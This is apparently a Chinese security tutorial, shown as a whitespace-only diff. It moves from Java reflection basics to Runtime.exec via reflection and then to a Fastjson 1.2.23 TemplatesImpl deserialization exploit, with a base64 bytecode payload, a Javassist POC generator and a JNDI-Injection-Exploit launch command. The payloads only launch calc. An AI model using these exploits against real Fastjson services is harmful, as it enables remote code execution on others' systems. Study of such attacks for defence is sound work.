 假设有一个名为 "`example.com`" 的公司，需要存储和管理员工信息。他们使用`LDAP`作为员工信息的目录服务，每个员工都在`LDAP`中有一个唯一的标识符（`DN`）。这里我们举两个员工例子：
 
 ```
-DN: uid=john,ou=People,dc=example,dc=com
-cn: John Doe
-sn: Doe
-givenName: John
-uid: john
-userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=
+DN: uid=john,ou=People,dc=example,dc=com
+cn: John Doe
+sn: Doe
+givenName: John
+uid: john
+userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=
 
-DN: uid=alice,ou=People,dc=example,dc=com
-cn: Alice Smith
-sn: Smith
-givenName: Alice
-uid: alice
-userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=
+DN: uid=alice,ou=People,dc=example,dc=com
+cn: Alice Smith
+sn: Smith
+givenName: Alice
+uid: alice
+userPassword: {SHA}W6ph5Mm5Pz8GgiULbPgzG37mj9g=
 
 
 ```
@@ -643,32 +643,32 @@ uid=john,ou=People,dc=example,dc=com
 如果我们不用反射的话，我们写的代码会是下面这样：`Person.java`：
 
 ```
-package org.example;
+package org.example;
 
-public class Person {
-    private String name;
-    private int age;
+public class Person {
+    private String name;
+    private int age;
 
-    public Person(String name, int age) {
-        this.name = name;
-        this.age = age;
-    }
+    public Person(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
 
-    public void sayHello() {
-        System.out.println("Hello, my name is " + name + ", I'm " + age + " years old.");
-    }
+    public void sayHello() {
+        System.out.println("Hello, my name is " + name + ", I'm " + age + " years old.");
+    }
 
-    public void setAge(int age) {
-        this.age = age;
-    }
+    public void setAge(int age) {
+        this.age = age;
+    }
 
-    @Override
-    public String toString() {
-        return "Person{" +
-                " + name + '\'' +
-                ", age=" + age +
-                '}';
-    }
+    @Override
+    public String toString() {
+        return "Person{" +
+                " + name + '\'' +
+                ", age=" + age +
+                '}';
+    }
 }
 
 
@@ -677,22 +677,22 @@ public class Person {
 `Main.java`：
 
 ```
-package org.example;
+package org.example;
 
-public class Main {
-    public static void main(String[] args) {
-        // 创建Person对象
-        Person person = new Person("张三", 20);
+public class Main {
+    public static void main(String[] args) {
+        // 创建Person对象
+        Person person = new Person("张三", 20);
 
-        // 调用Person对象的sayHello方法
-        person.sayHello();
+        // 调用Person对象的sayHello方法
+        person.sayHello();
 
-        // 修改Person对象的age属性
-        person.setAge(30);
+        // 修改Person对象的age属性
+        person.setAge(30);
 
-        // 输出修改后的Person对象信息
-        System.out.println(person);
-    }
+        // 输出修改后的Person对象信息
+        System.out.println(person);
+    }
 }
 
 
@@ -701,33 +701,33 @@ public class Main {
 运行结果如下：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm1VD3DNS173wt8pXNViaoMWCNZQWziagWxpXfLGONqDticvSprTyGwnAyw/640?wx_fmt=png)可以看到，我们一开始设置人的名字为张三，年龄为`20`，然后我们通过`setAge`方法来修改`Person`的`Age`属性，把年龄改成`30`。但是这么写是有问题的，因为我们不可能总是在编译之前就已经确定好我们要具体改什么值了，我们更希望这个值可以动态变化，所以需要用到`Java`反射技术。我们可以修改上面的`Main.py`为如下内容：
 
 ```
-package org.example;
+package org.example;
 
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 
-public class Main {
-    public static void main(String[] args) throws Exception {
-        // 获取Person类的Class对象
-        Class<?> clazz = Class.forName("org.example.Person");
+public class Main {
+    public static void main(String[] args) throws Exception {
+        // 获取Person类的Class对象
+        Class<?> clazz = Class.forName("org.example.Person");
 
-        // 创建Person对象
-        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
-        Object person = constructor.newInstance("张三", 20);
+        // 创建Person对象
+        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
+        Object person = constructor.newInstance("张三", 20);
 
-        // 调用Person对象的sayHello方法
-        Method method = clazz.getMethod("sayHello");
-        method.invoke(person);
+        // 调用Person对象的sayHello方法
+        Method method = clazz.getMethod("sayHello");
+        method.invoke(person);
 
-        // 修改Person对象的age属性
-        Field field = clazz.getDeclaredField("age");
-        field.setAccessible(true);
-        field.set(person, 30);
+        // 修改Person对象的age属性
+        Field field = clazz.getDeclaredField("age");
+        field.setAccessible(true);
+        field.set(person, 30);
 
-        // 输出修改后的Person对象信息
-        System.out.println(person);
-    }
+        // 输出修改后的Person对象信息
+        System.out.println(person);
+    }
 }
 
 
@@ -752,48 +752,48 @@ name=W01fh4cker
 然后修改`Main.java`：
 
 ```
-package org.example;
+package org.example;
 
-import java.io.FileInputStream;
-import java.util.Properties;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
+import java.io.FileInputStream;
+import java.util.Properties;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 
-public class Main {
-    public static void main(String[] args) throws Exception {
-        // 读取配置文件
-        Properties props = new Properties();
-        props.load(new FileInputStream("config.properties"));
+public class Main {
+    public static void main(String[] args) throws Exception {
+        // 读取配置文件
+        Properties props = new Properties();
+        props.load(new FileInputStream("config.properties"));
 
-        // 获取类的名称、方法名、属性名、属性值、姓名
-        String className = props.getProperty("class");
-        String methodName = props.getProperty("method");
-        String fieldName = props.getProperty("field");
-        String fieldValue = props.getProperty("value");
-        String name = props.getProperty("name");
+        // 获取类的名称、方法名、属性名、属性值、姓名
+        String className = props.getProperty("class");
+        String methodName = props.getProperty("method");
+        String fieldName = props.getProperty("field");
+        String fieldValue = props.getProperty("value");
+        String name = props.getProperty("name");
 
-        // 获取类的Class对象
-        Class<?> clazz = Class.forName(className);
+        // 获取类的Class对象
+        Class<?> clazz = Class.forName(className);
 
-        // 获取类的有参构造方法
-        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
+        // 获取类的有参构造方法
+        Constructor<?> constructor = clazz.getConstructor(String.class, int.class);
 
-        // 创建类的对象
-        Object obj = constructor.newInstance(name, 0);
+        // 创建类的对象
+        Object obj = constructor.newInstance(name, 0);
 
-        // 调用方法
-        Method method = clazz.getMethod(methodName);
-        method.invoke(obj);
+        // 调用方法
+        Method method = clazz.getMethod(methodName);
+        method.invoke(obj);
 
-        // 修改属性
-        Field field = clazz.getDeclaredField(fieldName);
-        field.setAccessible(true);
-        field.set(obj, Integer.parseInt(fieldValue));
+        // 修改属性
+        Field field = clazz.getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, Integer.parseInt(fieldValue));
 
-        // 输出修改后的对象信息
-        System.out.println(obj);
-    }
+        // 输出修改后的对象信息
+        System.out.println(obj);
+    }
 }
 
 
@@ -806,14 +806,14 @@ public class Main {
 前面讲了这么多关于反射的内容，可能很多初学者和我现在一样，处于一脸懵逼的状态，为什么要用到反射，而不是直接调用`java.lang.runtime`来执行命令？例如我们平时经常这么玩：
 
 ```
-package org.example;
+package org.example;
 
-import org.apache.commons.io.IOUtils;
+import org.apache.commons.io.IOUtils;
 
-public class Main {
-    public static void main(String[] args) throws Exception {
-        System.out.println(IOUtils.toString(Runtime.getRuntime().exec("calc.exe").getInputStream(), "UTF-8"));
-    }
+public class Main {
+    public static void main(String[] args) throws Exception {
+        System.out.println(IOUtils.toString(Runtime.getRuntime().exec("calc.exe").getInputStream(), "UTF-8"));
+    }
 }
 
 
@@ -823,9 +823,9 @@ public class Main {
 
 ```
 <dependency>
-    <groupId>commons-io</groupId>
-    <artifactId>commons-io</artifactId>
-    <version>2.11.0</version>
+    <groupId>commons-io</groupId>
+    <artifactId>commons-io</artifactId>
+    <version>2.11.0</version>
 </dependency>
 
 
@@ -834,26 +834,26 @@ public class Main {
 需要注意的是，要在上述依赖的上线加入`<dependencies></dependencies>`，如下图，然后点击如下图标来自动安装依赖：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmFehnswWJm0q67UzvvR69B2R3AdZxlh9Z1WibCYJRZia8tqNykvtllZOw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmITkHAB9FfUkwBxAS2gLNIZChuYSCkPYFoqD4De66EZ7Wv8Sor1sFibA/640?wx_fmt=png)然后运行程序，就会弹出计算器了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmPZZk1hGMNiabbZnQZfb4hYria4kQ2X2OkoVwFO80MMGpDBeiciczoKbSuQ/640?wx_fmt=png)这么做不就是可以执行命令了吗，为什么还要搞反射呢？**原来，**`**Java**`**安全机制会对代码的执行进行限制，例如限制代码的访问权限、限制代码的资源使用等。如果代码需要执行一些危险的操作，例如执行系统命令，就需要获取**`**Java**`**的安全权限。获取**`**Java**`**的安全权限需要经过一系列的安全检查，例如检查代码的来源、检查代码的签名等。如果代码没有通过这些安全检查，就无法获取**`**Java**`**的安全权限，从而无法执行危险的操作。然而，反射机制可以绕过**`**Java**`**安全机制的限制，比如可以访问和修改类的私有属性和方法，可以调用类的私有构造方法，可以创建和访问动态代理对象等。这些操作都是**`**Java**`**安全机制所禁止的，但是反射机制可以绕过这些限制，从而执行危险的操作。**原来如此！好了，现在来学习如何使用反射调用`java.lang.runtime`来执行命令，由于 Java9 之后，模块化系统被引入，模块化系统会限制反射的使用，从而提高`Java`应用程序的安全性，因此我们要区分版本来学习！为了方便演示，我重新建立了一个项目，并使用`Java8`。我们先看如下代码：
 
 ```
-// Java version: 8
-package org.example;
+// Java version: 8
+package org.example;
 
-import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.lang.reflect.Method;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.lang.reflect.Method;
 
-public class Main {
-    public static void main(String[] args) throws Exception {
-        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
-        Method execMethod = runtimeClass.getMethod("exec", String.class);
-        Process process = (Process) execMethod.invoke(Runtime.getRuntime(), "calc.exe");
-        InputStream in = process.getInputStream();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
-        String line;
-        while ((line = reader.readLine()) != null) {
-            System.out.println(line);
-        }
-    }
+public class Main {
+    public static void main(String[] args) throws Exception {
+        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
+        Method execMethod = runtimeClass.getMethod("exec", String.class);
+        Process process = (Process) execMethod.invoke(Runtime.getRuntime(), "calc.exe");
+        InputStream in = process.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+    }
 }
 
 
@@ -862,29 +862,29 @@ public class Main {
 成功执行：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmdeYGyzHbz38tqicoxib8iaHQXEsMfYKa3YjOiaHGHSfZwgKEpkwpIicactg/640?wx_fmt=png)然后再看在`Java17`下的执行反射的代码：
 
 ```
-// // Java version: 17
-package org.example;
+// // Java version: 17
+package org.example;
 
-import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.lang.invoke.MethodHandle;
-import java.lang.invoke.MethodHandles;
-import java.lang.invoke.MethodType;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.lang.invoke.MethodHandle;
+import java.lang.invoke.MethodHandles;
+import java.lang.invoke.MethodType;
 
-public class Main {
-    public static void main(String[] args) throws Throwable {
-        // 获取Runtime类对象
-        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
-        MethodHandle execMethod = MethodHandles.lookup().findVirtual(runtimeClass, "exec", MethodType.methodType(Process.class, String.class));
-        Process process = (Process) execMethod.invokeExact(Runtime.getRuntime(), "calc.exe");
-        InputStream in = process.getInputStream();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
-        String line;
-        while ((line = reader.readLine()) != null) {
-            System.out.println(line);
-        }
-    }
+public class Main {
+    public static void main(String[] args) throws Throwable {
+        // 获取Runtime类对象
+        Class<?> runtimeClass = Class.forName("java.lang.Runtime");
+        MethodHandle execMethod = MethodHandles.lookup().findVirtual(runtimeClass, "exec", MethodType.methodType(Process.class, String.class));
+        Process process = (Process) execMethod.invokeExact(Runtime.getRuntime(), "calc.exe");
+        InputStream in = process.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+    }
 }
 
 
@@ -903,18 +903,18 @@ public class Main {
 我们看以下案例：首先创建一个`maven`项目、导入`Fastjson1.2.23`并自动下载相关依赖（怎么自动下载的见上文配图）：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmlNwywNRL2SXLYKtec6YibAVoWhtS4f4PYBiaZdzHGm4ydUGug1WewPcw/640?wx_fmt=png)然后写入如下代码至`Main.java`（此时已经不需要`Person.java`了）：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args) {
-        ParserConfig config = new ParserConfig();
-        String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ \}\}";
-        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
-    }
+public class Main {
+    public static void main(String[] args) {
+        ParserConfig config = new ParserConfig();
+        String text = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ \}\}";
+        Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
+    }
 }
 
 
@@ -927,31 +927,31 @@ public class Main {
 上面的`text`里面的`_bytecodes`的内容是以下内容编译成字节码文件后（`.class`）再`base64`编码后的结果：
 
 ```
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
-import java.io.IOException;
+import java.io.IOException;
 
-public class Test extends AbstractTranslet {
-    public Test() throws IOException {
-        Runtime.getRuntime().exec("calc");
-    }
+public class Test extends AbstractTranslet {
+    public Test() throws IOException {
+        Runtime.getRuntime().exec("calc");
+    }
 
-    @Override
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
-    }
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+    }
 
-    @Override
-    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
+    @Override
+    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
 
-    }
+    }
 
-    public static void main(String[] args) throws Exception {
-        Test t = new Test();
-    }
+    public static void main(String[] args) throws Exception {
+        Test t = new Test();
+    }
 }
 
 
@@ -968,7 +968,7 @@ public class Test extends AbstractTranslet {
 但是在实战场景中，`Java`的`ClassLoader`类提供了`defineClass()`方法，可以把字节数组转换成`Java`类的示例，但是这里面的方法的作用域是被`Protected`修饰的，也就是说这个方法只能在`ClassLoader`类中访问，不能被其他包中的类访问：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmdISum3p2yMSQBJiaicA0n2DoqKicDkrCWibWl4icLufw4UvYp5hSjNt2dwA/640?wx_fmt=png)但是，在`TransletClassLoader`类中，`defineClass`调用了`ClassLoader`里面的`defineClass`方法：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm0LbRYoiaaOvb9AZfhTEUCqrkuWzYuibXWuia3gwdGPDAGibAgyw6SYibu1g/640?wx_fmt=png)然后追踪`TransletClassLoader`，发现是`defineTransletClasses`：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmFusqxGDGvGHicwhbibS3hUDHIgNb9DPU5e1mpY47cdjz981JxWOrWKjQ/640?wx_fmt=png)再往上，发现是`getTransletInstance`：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm0sgBibylsWIZvVXRFPcbOrO1BTCicOOw6ZgvibnSnvkXhgGAYBiafwpiavA/640?wx_fmt=png)到此为止，要么是`Private`修饰要么就是`Protected`修饰，再往上继续追踪，发现是`newTransformer`，可以看到此时已经是`public`了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmdkfSkaHoa5cuIQibtxGxjardObfkqibWjAgH8Cic0ljz4uibRpkpLllW8A/640?wx_fmt=png)因此，我们的利用链是：
 
 ```
-TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
+TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
 
 
 ```
@@ -976,50 +976,50 @@ TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> Tem
 基于此，我们可以写出如下`POC`：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
-import com.alibaba.fastjson.parser.ParserConfig;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import javassist.ClassPool;
-import javassist.CtClass;
-import java.util.Base64;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import javassist.ClassPool;
+import javassist.CtClass;
+import java.util.Base64;
 
-public class Main {
-    public static class test{
-    }
+public class Main {
+    public static class test{
+    }
 
-    public static void main(String[] args) throws Exception {
-        ClassPool pool = ClassPool.getDefault();
-        CtClass cc = pool.get(test.class.getName());
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.get(test.class.getName());
 
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
 
-        cc.makeClassInitializer().insertBefore(cmd);
+        cc.makeClassInitializer().insertBefore(cmd);
 
-        String randomClassName = "W01fh4cker" + System.nanoTime();
-        cc.setName(randomClassName);
+        String randomClassName = "W01fh4cker" + System.nanoTime();
+        cc.setName(randomClassName);
 
-        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
+        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
 
-        try {
-            byte[] evilCode = cc.toBytecode();
-            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
-            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
-            String text1 = "{"+
-                    "\"@type\":\"" + NASTY_CLASS +"\","+
-                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
-                    "'_name':'W01h4cker',"+
-                    "'_tfactory':{ },"+
-                    "'_outputProperties':{ }"+
-                    "}\n";
-            ParserConfig config = new ParserConfig();
-            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+        try {
+            byte[] evilCode = cc.toBytecode();
+            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
+            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
+            String text1 = "{"+
+                    "\"@type\":\"" + NASTY_CLASS +"\","+
+                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
+                    "'_name':'W01h4cker',"+
+                    "'_tfactory':{ },"+
+                    "'_outputProperties':{ }"+
+                    "}\n";
+            ParserConfig config = new ParserConfig();
+            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 }
 
 
@@ -1033,11 +1033,11 @@ public class Main {
 
 ```
 {
- "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
- "_bytecodes": ["yv66vgAAADQA...CJAAk="],
- "_name": "W01fh4cker",
- "_tfactory": {},
- "_outputProperties": {},
+ "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+ "_bytecodes": ["yv66vgAAADQA...CJAAk="],
+ "_name": "W01fh4cker",
+ "_tfactory": {},
+ "_outputProperties": {},
 }
 
 
@@ -1096,7 +1096,7 @@ org.springframework
 我们先去`[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)`下载个`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`，然后启动利用工具：
 
 ```
-java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
+java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
 
 
 ```
@@ -1104,27 +1104,27 @@ java -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "c
